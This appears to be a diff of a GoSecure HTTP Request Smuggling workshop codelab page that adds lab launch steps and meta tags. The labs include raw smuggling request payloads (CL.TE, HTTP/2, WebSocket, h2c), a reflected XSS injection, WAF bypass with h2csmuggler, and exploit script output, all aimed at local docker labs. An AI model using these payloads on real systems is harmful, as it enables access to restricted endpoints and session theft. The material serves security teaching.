@@ -18,7 +18,13 @@
       color: red;
     }
   </style>
-</head>
+<!-- Meta added -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:creator" content="@GoSecure_Inc" />
+<meta property="og:title" content="HTTP Request Smuggling Workshop" />
+<meta property="og:image" content="https://gosecure.github.io/request-smuggling-workshop/preview.png"/>
+<meta property="og:description" content="This workshop provides an overview of the latest research on HTTP Request Smuggling (HRS). HTTP1, HTTP2, WebSocket, h2c and more." />
+<!-- Meta added --></head>
 <body>
   <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
   <google-codelab codelab-gaid="UA-153352998-3"
@@ -28,9 +34,8 @@
                   feedback-link="https://github.com/GoSecure/request-smuggling-workshop/issues">
     
       <google-codelab-step label="Introduction" duration="5">
-        <p class="image-container"><img alt="HTTP Request Smuggling Workshop" src="img\\6e6e354ad1ccaeec.png"></p>
-<p>Welcome to the workshop segment of this presentation on Request Smuggling. Now is the time to put the theory discussed into practice.</p>
-<p>At the end of the workshop, you will be familiar with four attack variants of HTTP Request Smuggling. You will also have a test environment to experiment further with the attack. All the custom applications and system configurations are open-source.</p>
+        <p class="image-container"><img alt="HTTP Request Smuggling Workshop" src="img\\212c69273a3e36c3.png"></p>
+<p>Welcome to this workshop on Request Smuggling. It is an opportunity to experiment with the vulnerability with realistic infrastructures. At the end of the workshop, you will be familiar with four attack variants of HTTP Request Smuggling. You will also have a test environment to experiment further with the attack. All the custom applications and system configurations are open-source.</p>
 <h2 is-upgraded>Requirements</h2>
 <p>The only requirement is to have an HTTP interception proxy installed. BurpSuite is the only one recommended  for its support for HTTP2.</p>
 <ul>
@@ -150,15 +155,18 @@ Conference!\r\n
       </google-codelab-step>
     
       <google-codelab-step label="LAB 1: HTTP/1.1 CL.TE" duration="20">
-        <p>For this first lab, you need to launch the application using the following commands:</p>
+        <p>For this first lab, we are going to exploit a proxy that only use <code>Content-Length</code> while the application is supporting <code>Transfer-Encoding</code>.</p>
+<p class="image-container"><img alt="Infrastructure CL TE" src="img\\bd3990080f01734e.png"></p>
+<h2 is-upgraded>Launching the application</h2>
+<p>You need to launch the application using the following commands:</p>
 <pre><code>&gt; cd 01_http1_clte
 &gt; docker-compose up
 </code></pre>
-<p>Open <code>http://localhost</code> in a browser to confirm that everything is running.</p>
+<p>Open <a href="http://localhost" target="_blank">http://localhost</a> in a browser to confirm that everything is running.</p>
 <h2 is-upgraded>HRS detection</h2>
 <p>The following request needs to repeated ~10 times until you get <code>405 Not Allowed</code> (Method not allowed).</p>
 <pre><code>POST / HTTP/1.1
-Host: simplewebsite.gosec.co
+Host: localhost
 Content-Length: 79
 Transfer-Encoding: chunked
 
@@ -182,7 +190,7 @@ G
 <p class="image-container"><img alt="Burp repeater reflected value" src="img\\951f1d0f924719b1.png"></p>
 <p>Because we have confirm that HRS is possible, the next step is to injecting an HTTP request with the reflected XSS in the proxy pipeline. If the proxy only consider <code>Content-Length: 79</code> and the backend supports chunked encoding, than the backend will see two requests instead of one. (See payload below)</p>
 <pre><code>POST / HTTP/1.1
-Host: simplewebsite.gosec.co
+Host: localhost
 Content-Length: 79
 Transfer-Encoding: chunked
 
@@ -279,7 +287,7 @@ Host: 127.0.0.1:80
 
 
 </code></pre>
-<p>Now, let&#39;s see it in action.</p>
+<p>Now, let&#39;s see it in action in the next lab exercise.</p>
 
 
       </google-codelab-step>
@@ -287,6 +295,12 @@ Host: 127.0.0.1:80
       <google-codelab-step label="LAB 2: HTTP/2" duration="20">
         <p>For this lab, the <a href="https://armeria.dev/" target="_blank">Armenia proxy</a> is used. The proxy route request to two different web applications base on the requested path. HTTP2 Request Smuggling will allow us to access path that were not intent to be public.</p>
 <p class="image-container"><img alt="HTTP2 request smuggling schema" src="img\\b2a0f95fd89cc78c.png"></p>
+<h2 is-upgraded>Launching the application</h2>
+<p>You need to launch the application using the following commands:</p>
+<pre><code>&gt; cd 02_http2_cl
+&gt; docker-compose up
+</code></pre>
+<p>Open <a href="https://localhost:8443" target="_blank">https://localhost:8443</a> in a browser to confirm that everything is running. The TLS certificate is self-signed.</p>
 <h2 is-upgraded>Detection</h2>
 <p>Before doing requests to hidden resources, we need to confirm the proxy and backend are vulnerable. To do this test, we are using path are known to have valid response.</p>
 <p>The following requests will test if the proxy transform HTTP2 request to HTTP1 without validation to unnecessary header such as the <code>content-length</code>.</p>
@@ -393,7 +407,21 @@ optional arguments:
       </google-codelab-step>
     
       <google-codelab-step label="LAB 3: WebSocket" duration="20">
-        <p class="image-container"><img alt="WebSocket lab 3 preview" src="img\\1fafe792ee926d81.png"></p>
+        <p>For this lab, we are going use a fake WebSocket handshake to &#34;smuggle&#34; HTTP1 requests inside an open stream.</p>
+<aside class="special"><p><strong>IMPORTANT:</strong> This technique will only work if <em>the server ignore status code</em> or if <em>the backend application can return status code 101</em>.</p>
+</aside>
+<p class="image-container"><img alt="WebSocket lab 3 diagram" src="img\\bd77fc0074e8c450.png"></p>
+<h2 is-upgraded>Launching the application</h2>
+<p>You need to launch the application using the following commands:</p>
+<pre><code>&gt; cd 03_websocket
+&gt; docker-compose up
+</code></pre>
+<p>You will also need this companion application that returns 101.</p>
+<pre><code>&gt; cd 03_websocket_statuscode_helper
+&gt; docker-compose up
+</code></pre>
+<p>Open <a href="http://localhost:8002" target="_blank">http://localhost:8002</a> in a browser to confirm that everything is running.</p>
+<p class="image-container"><img alt="WebSocket lab 3 preview" src="img\\1fafe792ee926d81.png"></p>
 <h2 is-upgraded>Objective</h2>
 <p>In this exercise, the proxy is blocking specific URLs from being accessed. The URLs blocked are part of <a href="https://docs.spring.io/spring-boot/docs/current/actuator-api/htmlsingle/" target="_blank">Spring actuator API</a>. Developers use it mainly in development mode for debugging their applications or microservices. It has the potential to leak user sessions (via <code>/trace</code> or <code>/httptrace</code>) and enable <a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database" target="_blank">RCE when some extensions are enable</a>.</p>
 <p class="image-container"><img alt="Forbidden access actuator spring" src="img\\6dd0d001a257f666.png"></p>
@@ -402,7 +430,7 @@ optional arguments:
 <p>The application simulates a proxy endpoint that received a URL fetches the URL and returns its content. The feature abused is the status code can be controlled by the attacker. To simply the demonstration a <code>code</code> parameter was added to simplify the attack. The status code return will be based on the code passed.</p>
 <p>While the possibility of controlling the status code will not be the most common behavior, it illustrates that it only takes minor small details to confuse proxies.</p>
 <p>The exploit is sending two requests. The first is triggering the 101 response.</p>
-<pre><code language="language-http" class="language-http">POST /health-check HTTP/1.1
+<pre><code language="language-http" class="language-http">POST /health-check?url=http://host.docker.internal:8888 HTTP/1.1
 Host: localhost:3001
 Connection: Upgrade
 Upgrade: websocket
@@ -410,7 +438,7 @@ Sec-WebSocket-Version: 1337
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 31
 
-url=http://dummy&amp;code=101
+
 </code></pre>
 <p>The second request is a normal HTTP request that is taught to be a WebSocket</p>
 <pre><code language="language-http" class="language-http">GET /env HTTP/1.1
@@ -419,7 +447,7 @@ Host: localhost:3001
 
 </code></pre>
 <h2 is-upgraded>Running the exploit</h2>
-<p>Along with the code to run the third lab, you will see that there is a working exploit script called unoriginally <code>exploit.py</code>. When you will execute it, you will see the complete HTTP responses.</p>
+<p>Along with the code to run the third lab, you will see that there is a working exploit script called  <code>exploit.py</code>. When you will execute it, you will see the complete HTTP responses.</p>
 <pre><code>&gt;python exploit.py
 HTTP/1.1 101
 Server: nginx/1.17.6
@@ -460,8 +488,16 @@ c07
       </google-codelab-step>
     
       <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext (part 1)" duration="10">
-        <h2 is-upgraded>Scenario 1: Bypassing WAF</h2>
-<p>Visit <code>http://localhost:8443/movie?id=1</code>. If you attempt to tamper with the parameter <code>id</code>, you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder <em>(see impossible)</em> when a strong firewall is in place. By default, NAXSI is configured to block all quotes <code>'</code> characters. However, with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall.</p>
+        <p>For this lab, we are going use h2c protocol to &#34;smuggle&#34; HTTP2 requests that will be ignored by Web Application Firewall (WAF).</p>
+<p class="image-container"><img alt="lab 4 diagram" src="img\\fecf5a7e03be631a.png"></p>
+<h2 is-upgraded>Launching the application</h2>
+<p>You need to launch the application using the following commands:</p>
+<pre><code>&gt; cd 04_http2_cleartext
+&gt; docker-compose up
+</code></pre>
+<p>Open <a href="https://localhost:8443" target="_blank">https://localhost:8443</a> in a browser to confirm that everything is running.</p>
+<h2 is-upgraded>Scenario 1: Bypassing WAF</h2>
+<p>Visit <code>https://localhost:8443/movie?id=1</code>. If you attempt to tamper with the parameter <code>id</code>, you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder <em>(see impossible)</em> when a strong firewall is in place. By default, NAXSI is configured to block all quotes <code>'</code> characters. However, with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall.</p>
 <h2 is-upgraded>Validation</h2>
 <p>First, we need to validate that HTTP2 cleartext is supported by the backend. If the backend application does not support it, this technique will not work.</p>
 <pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 -t
